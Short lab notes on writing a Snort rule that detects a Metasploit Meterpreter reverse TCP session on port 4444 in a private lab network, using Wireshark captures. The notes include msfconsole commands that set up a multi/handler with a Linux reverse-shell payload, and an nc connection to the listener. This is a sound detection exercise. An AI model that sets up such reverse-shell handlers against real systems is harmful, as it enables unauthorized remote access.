# snort Reverse TCP Meterpeter rule


# setup and install snort
sudo apt install snort

cd Desktop
mkdir snort 
cd snort
touch base.rules
mkdir logs



# rules
alert tcp 192.168.56.7 4444 -> any any (msg:"Posible meterpreter"; sid:1000000)


# setup metasploit

sudo msfdb init
sudo systemctl start postgresql
msfconsole


use exploit/multi/handler
set LHOST 192.168.56.7
set payload payload/linux/x64/meterpreter_reverse_tcp


# setup a listener

nc 192.168.56.7 4444

# capture traffic with wireshark
# run exploit


# save the capture as .pcap (Wireshark/tcpdump)

# run snort on the pcap file with the rule file we made
snort -k none -l ./logs/ -c ./base.rules -r ./met.pcap




# review logs
cat logs/alert| tail -14